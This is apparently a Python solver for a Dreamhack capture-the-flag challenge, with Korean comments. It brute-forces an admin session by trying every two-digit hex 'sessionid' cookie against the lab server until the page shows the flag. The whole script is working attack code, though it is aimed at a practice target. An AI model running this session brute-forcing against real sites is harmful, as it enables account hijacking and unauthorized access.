import requests

# 서버 URL
url = 'http://host1.dreamhack.games:17956/'

# 세션 ID는 00부터 ff까지 순차적으로 시도
for i in range(256):  # 0부터 255까지 반복 (16진수로 00부터 ff까지)
    session_id = format(i, '02x')  # 2자리 16진수로 포맷 (예: 00, 01, ..., ff)
    cookies = {'sessionid': session_id}
    
    # GET 요청 보내기
    response = requests.get(url, cookies=cookies)
    
    # 응답 내용 출력 (로그 확인용)
    if 'flag is' in response.text:  # 응답에서 'flag is' 문자열이 포함되어 있으면
        print(f"Found admin session! Session ID: {session_id}")
        print(response.text)  # 'admin'으로 로그인된 페이지 출력
        break  # 찾았으면 반복문 종료
